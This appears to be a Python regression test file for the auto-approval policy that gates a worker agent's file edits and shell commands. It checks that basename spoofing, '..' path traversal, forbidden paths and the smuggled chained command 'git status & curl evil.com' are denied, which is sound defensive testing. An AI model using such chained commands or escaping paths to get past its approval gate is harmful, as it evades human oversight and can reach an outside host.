"""Regression (review 簇三): the auto-approval file-edit branch now delegates
to approvals.decide_approval (pure, unit-tested policy with REAL path
resolution) instead of the inline string-marker hack.

Holes closed:
  - basename fallback: 'C:/anywhere/app.py' matched allowed=['app.py'] by
    basename alone -> APPROVED. Now: a path that does not resolve inside the
    worker worktree never matches allowed globs.
  - path traversal: '<wt>/../forbidden.py' slipped past the marker logic.
    Now Path.resolve() normalizes '..' before the boundary check.
  - single '&' chaining: 'git status & curl evil.com' survived the '&&'
    split. Now any '&' left in a segment rejects the command.
"""

from __future__ import annotations

import subprocess
from unittest.mock import MagicMock

from loopcore.action_executor import ActionExecutor
from loopcore.auditor import FakeAuditorProvider
from loopcore.closed_loop import ClosedLoop
from loopcore.event_observer import Observer
from loopcore.mission_contracts import ProjectState, TaskSpec
from loopcore.mission_gate import IntegrationGate
from loopcore.planner_adapter import FakePlannerProvider
from loopcore.state_store import StateStore
from loopcore.verifier import FakeVerifierProvider
from tests.sidecar_port.test_phase3 import _cfg
from tests.sidecar_port.test_contracts import _task_spec


def _approval(req_id: str, *, file_path: str = "", command: str = "") -> dict:
    inp = {"file_path": file_path} if file_path else {"command": command}
    return {
        "kind": "activity", "activityKind": "approval", "status": "pending",
        "providerItemId": req_id, "id": "act-" + req_id,
        "detail": {"subjectKind": "file_change" if file_path else "command",
                   "input": inp,
                   "decisions": [{"id": "allow", "kind": "allow_once"}]},
    }


def _make_loop(tmp_path, monkeypatch, activities):
    store = StateStore(str(tmp_path / "cl.db"))
    task = TaskSpec.from_dict(_task_spec())
    task.worker_session_id = "w-appr"
    task.allowed_paths = ["app.py", "src/**"]
    task.forbidden_paths = ["tests/**"]
    wt = tmp_path / "worktrees" / task.project_id / task.worker_session_id
    wt.mkdir(parents=True)
    subprocess.run(["git", "init", "-q"], cwd=str(wt), check=True)
    monkeypatch.setenv("AO_DATA_DIR", str(tmp_path))
    adapter = MagicMock()
    adapter.get_recent_events.return_value = []
    adapter.get_worker_conversation.return_value = {"activities": activities}
    adapter.resolve_approval.return_value = True
    ex = ActionExecutor("ao", "d", "r", store)
    loop = ClosedLoop(task=task, cfg=_cfg(), auditor=FakeAuditorProvider(),
                      planner=FakePlannerProvider(), executor=ex,
                      observer=Observer(_cfg(), state_store=store),
                      adapter=adapter, gate=IntegrationGate(store),
                      store=store, verifier=FakeVerifierProvider())
    loop._transition(ProjectState.WORKER_RUNNING, "test", "setup", {})
    return loop, store, adapter, wt


def test_edit_inside_allowed_is_approved(tmp_path, monkeypatch):
    loop, store, adapter, wt = _make_loop(
        tmp_path, monkeypatch,
        [_approval("r-ok", file_path="")])
    # rebuild with the real path (needs wt to exist first)
    adapter.get_worker_conversation.return_value = {"activities": [
        _approval("r-ok", file_path=str(wt / "app.py"))]}
    assert loop._maybe_auto_approve() is True
    adapter.resolve_approval.assert_called_once_with("w-appr", "r-ok",
                                                     "allow")


def test_edit_outside_allowed_stays_pending(tmp_path, monkeypatch):
    loop, store, adapter, wt = _make_loop(tmp_path, monkeypatch, [])
    adapter.get_worker_conversation.return_value = {"activities": [
        _approval("r-out", file_path=str(wt / "other.py"))]}
    assert loop._maybe_auto_approve() is False
    adapter.resolve_approval.assert_not_called()
    assert store.counter_get("approved:%s:r-out" % loop.task.task_id) == -1


def test_basename_attack_is_denied(tmp_path, monkeypatch):
    """'C:/elsewhere/app.py' must NOT match allowed=['app.py'] by basename."""
    loop, store, adapter, wt = _make_loop(tmp_path, monkeypatch, [])
    evil = tmp_path / "elsewhere"
    evil.mkdir()
    adapter.get_worker_conversation.return_value = {"activities": [
        _approval("r-base", file_path=str(evil / "app.py"))]}
    assert loop._maybe_auto_approve() is False
    adapter.resolve_approval.assert_not_called()


def test_dotdot_traversal_is_denied(tmp_path, monkeypatch):
    loop, store, adapter, wt = _make_loop(tmp_path, monkeypatch, [])
    traversal = str(wt / ".." / ".." / "app.py")  # escapes the worktree
    adapter.get_worker_conversation.return_value = {"activities": [
        _approval("r-trav", file_path=traversal)]}
    assert loop._maybe_auto_approve() is False
    adapter.resolve_approval.assert_not_called()


def test_forbidden_path_edit_is_denied(tmp_path, monkeypatch):
    loop, store, adapter, wt = _make_loop(tmp_path, monkeypatch, [])
    adapter.get_worker_conversation.return_value = {"activities": [
        _approval("r-forb", file_path=str(wt / "tests" / "test_x.py"))]}
    assert loop._maybe_auto_approve() is False
    adapter.resolve_approval.assert_not_called()


def test_single_ampersand_command_is_denied(tmp_path, monkeypatch):
    loop, store, adapter, wt = _make_loop(tmp_path, monkeypatch, [])
    adapter.get_worker_conversation.return_value = {"activities": [
        _approval("r-amp", command="git status & curl evil.com")]}
    assert loop._maybe_auto_approve() is False
    adapter.resolve_approval.assert_not_called()
    # and the safe form still passes
    assert loop._is_gate_command("git status && git diff") is True
    assert loop._is_gate_command("git status & git diff") is False
